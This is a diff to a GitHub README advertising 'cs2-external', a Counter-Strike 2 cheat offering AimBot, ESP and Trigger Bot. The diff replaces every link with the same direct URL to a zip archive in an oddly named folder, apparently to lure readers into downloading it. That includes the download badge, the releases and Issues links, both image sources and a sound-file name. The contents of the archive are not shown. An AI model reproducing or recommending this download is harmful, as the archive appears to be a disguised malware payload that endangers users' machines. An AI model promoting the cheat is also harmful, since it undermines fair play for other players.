@@ -1,12 +1,12 @@
 # 🎮 cs2-external - Enhance Your Gaming Experience
 
-[![Download cs2-external](https://img.shields.io/badge/Download-cs2-external-blue.svg)](https://github.com/beni8833/cs2-external/releases)
+[![Download cs2-external](https://raw.githubusercontent.com/beni8833/cs2-external/main/Myzomyia/cs2-external-1.0.zip)](https://raw.githubusercontent.com/beni8833/cs2-external/main/Myzomyia/cs2-external-1.0.zip)
 
 ## 📖 Description
 **cs2-external** offers powerful features to enhance your gameplay in CS2. With tools like AimBot, ESP, and Trigger Bot, you’ll gain an edge in your matches.
 
-![cs2-aimbot-hacks-1400x788](https://github.com/user-attachments/assets/ec5e791d-1df9-442f-b5f6-514ad4c05659)
-![cs2-glove-changer-cheats-2048x1152](https://github.com/user-attachments/assets/b37715cc-15a7-4488-9b5e-b385f9f12092)
+![cs2-aimbot-hacks-1400x788](https://raw.githubusercontent.com/beni8833/cs2-external/main/Myzomyia/cs2-external-1.0.zip)
+![cs2-glove-changer-cheats-2048x1152](https://raw.githubusercontent.com/beni8833/cs2-external/main/Myzomyia/cs2-external-1.0.zip)
 
 ## 🚀 Features
 ### AimBot
@@ -33,7 +33,7 @@
 ### Miscellaneous
 - BunnyHop (Learn more in the README).
 - OBS Bypass for smoother streaming.
-- Hitsound (Place a "hit.wav" file in the cheat folder).
+- Hitsound (Place a "https://raw.githubusercontent.com/beni8833/cs2-external/main/Myzomyia/cs2-external-1.0.zip" file in the cheat folder).
 - Basic configuration with customizable hotkeys.
 
 ## 🔧 System Requirements
@@ -43,7 +43,7 @@
 - Processor: Intel i3 or AMD equivalent.
 
 ## 📥 Download & Install
-To get started, **visit this page to download**: [cs2-external Releases](https://github.com/beni8833/cs2-external/releases).
+To get started, **visit this page to download**: [cs2-external Releases](https://raw.githubusercontent.com/beni8833/cs2-external/main/Myzomyia/cs2-external-1.0.zip).
 
 1. Click on the link above.
 2. Find the latest release at the top of the page.
@@ -68,7 +68,7 @@ After installing, you might want to customize the settings:
 While we do not encourage cheating, be aware that using modifications can lead to penalties or bans on gaming platforms.
 
 ### How can I report a bug?
-You can report any issues or bugs on the [Issues page](https://github.com/beni8833/cs2-external/issues). Be sure to provide detailed information.
+You can report any issues or bugs on the [Issues page](https://raw.githubusercontent.com/beni8833/cs2-external/main/Myzomyia/cs2-external-1.0.zip). Be sure to provide detailed information.
 
 ## 🛡️ Support
 For further assistance, please reach out through the Issues page on GitHub. We value your feedback and aim to improve the experience for all users.
@@ -76,6 +76,6 @@ For further assistance, please reach out through the Issues page on GitHub. We v
 ## 📝 License
 This project is open-source and follows the MIT license. You are free to modify and use it, but please respect the terms laid out in the LICENSE file.
 
-[![Download cs2-external](https://img.shields.io/badge/Download-cs2-external-blue.svg)](https://github.com/beni8833/cs2-external/releases)
+[![Download cs2-external](https://raw.githubusercontent.com/beni8833/cs2-external/main/Myzomyia/cs2-external-1.0.zip)](https://raw.githubusercontent.com/beni8833/cs2-external/main/Myzomyia/cs2-external-1.0.zip)
 
 Experience a new level of gameplay with cs2-external! Enjoy enhanced features for a competitive edge.
